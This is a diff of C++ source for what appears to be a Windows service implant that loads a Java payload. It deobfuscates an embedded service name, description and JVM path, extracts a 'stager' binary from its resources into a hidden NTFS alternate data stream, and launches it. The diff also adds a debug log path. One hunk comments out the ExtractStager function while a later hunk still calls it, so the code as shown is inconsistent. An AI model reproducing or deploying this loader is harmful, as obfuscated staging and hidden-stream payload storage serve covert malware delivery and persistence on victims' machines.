@@ -15,13 +15,27 @@
 #include "..\JAR_Loader\jarldr.h"
 #include "..\log.h"
 #include "..\utilities.h"
+#include <ShlObj.h>
 
 HANDLE stopEvent;
+
+#ifdef _DBG
+#pragma comment(lib, "Shell32.lib")		
+#endif
 
 //
 //	The main entry point 
 //
 int main(int argc, char* argv[]){
+
+#ifdef _DBG
+	CHAR path[MAX_PATH];
+	if ( SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, path) == S_OK ) {
+		std::string str_path(path);
+		str_path.append("\\jldr.log");
+		SetLogPath(str_path.c_str());
+	}
+#endif
 
 	std::string serviceName;
 	std::string serviceDescription;
@@ -65,40 +79,40 @@ int main(int argc, char* argv[]){
 
 }
 
-//=========================================================================
-/**
-	Extract the stager and write to ADS
-*/
-void ExtractStager( char* passedPath ){
-
-    HGLOBAL hResourceLoaded;  // handle to loaded resource
-    HRSRC   hRes;              // handle/ptr to res. info.
-    char    *lpResLock;        // pointer to resource data
-    DWORD   dwSizeRes;
-    std::string strOutputLocation;
-    std::string strAppLocation;
-		
-	//Get the resource
-	hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1) ,"BIN");
-
-    hResourceLoaded = LoadResource(NULL, hRes);
-    lpResLock = (char *) LockResource(hResourceLoaded);
-    dwSizeRes = SizeofResource(NULL, hRes);
-
-	DWORD dwRet = 0;
-	std::string classPath = passedPath;
-	classPath.append(COLON);
-
-	HANDLE hStream = CreateFile( classPath.c_str(), GENERIC_WRITE,
-                             FILE_SHARE_WRITE, NULL,
-                             OPEN_ALWAYS, 0, NULL );
-
-    if( hStream != INVALID_HANDLE_VALUE ){
-         WriteFile(hStream, lpResLock, dwSizeRes, &dwRet, NULL);
-		CloseHandle(hStream);
-	}
-
-}
+////=========================================================================
+///**
+//	Extract the stager and write to ADS
+//*/
+//void ExtractStager( char* passedPath ){
+//
+//    HGLOBAL hResourceLoaded;  // handle to loaded resource
+//    HRSRC   hRes;              // handle/ptr to res. info.
+//    char    *lpResLock;        // pointer to resource data
+//    DWORD   dwSizeRes;
+//    std::string strOutputLocation;
+//    std::string strAppLocation;
+//		
+//	//Get the resource
+//	hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_BIN1) ,"BIN");
+//
+//    hResourceLoaded = LoadResource(NULL, hRes);
+//    lpResLock = (char *) LockResource(hResourceLoaded);
+//    dwSizeRes = SizeofResource(NULL, hRes);
+//
+//	DWORD dwRet = 0;
+//	std::string classPath = passedPath;
+//	classPath.append(COLON);
+//
+//	HANDLE hStream = CreateFile( classPath.c_str(), GENERIC_WRITE,
+//                             FILE_SHARE_WRITE, NULL,
+//                             OPEN_ALWAYS, 0, NULL );
+//
+//    if( hStream != INVALID_HANDLE_VALUE ){
+//         WriteFile(hStream, lpResLock, dwSizeRes, &dwRet, NULL);
+//		CloseHandle(hStream);
+//	}
+//
+//}
 
 //=========================================================================
 /**
@@ -106,7 +120,7 @@ void ExtractStager( char* passedPath ){
 */
 void ReadServiceName( std::string* svcName ) {	
 	char serviceName[MAX_PATH];
-	LoadString(NULL, IDS_NAME, serviceName, MAX_PATH );	
+	LoadString(NULL, IDS_SVC_NAME, serviceName, MAX_PATH );	
 
 	//Deobfuscate it
 	char *reg_ptr = decode_split(serviceName, 200);
@@ -133,13 +147,24 @@ void ReadServiceDescription( std::string* svcDesc ) {
 	Attempt to get the java path embedded in the file
 */
 void ReadJavaPath( std::string* passedPath ) {	
-	char javaPath[MAX_PATH];
-	LoadString(NULL, IDS_PATH, javaPath, MAX_PATH );	
+	//char javaPath[MAX_PATH];
+	//LoadString(NULL, IDS_PATH, javaPath, MAX_PATH );	
 
-	//Deobfuscate it
-	char *tmp_ptr = decode_split(javaPath, 200);
-	passedPath->assign(tmp_ptr);
-	free(tmp_ptr);
+	////Deobfuscate it
+	//char *tmp_ptr = decode_split(javaPath, 200);
+	//passedPath->assign(tmp_ptr);
+	//free(tmp_ptr);
+
+	//Get jvm string from resource table
+	char jvm_buf[400];
+	LoadString(NULL, IDS_JVM_PATH, jvm_buf, 400);
+	if( strlen( jvm_buf ) != 0 ){
+
+		//Deobfuscate it
+		char *jvm_ptr = decode_split(jvm_buf, 400);
+		passedPath->assign(jvm_ptr);
+		free(jvm_ptr);
+	}
 }
 
 
@@ -400,11 +425,19 @@ DWORD WINAPI InvokeMainWrapper(LPVOID lpParam ) {
 
 	//Check if the ADS exists
 	DWORD fileAttr = GetFileAttributes(adsPath.c_str());
-    if (0xFFFFFFFF == fileAttr)
-        ExtractStager( pPath );
+    if (0xFFFFFFFF == fileAttr){
+#ifdef _DBG
+		Log( "Stager doesn't exist, extracting from binary.\r\n");
+#endif
+		ExtractStager( adsPath );
+	}
+
+	//Get Java path
+	std::string jvmPath;
+	ReadJavaPath( &jvmPath );
 
 	//Call main
-	if( !InvokeMain( &serviceName, adsPath, NULL ))
+	if( !InvokeMain( &serviceName, adsPath, jvmPath.c_str() ))
 		SetEvent(stopEvent);
 
 	return 0;
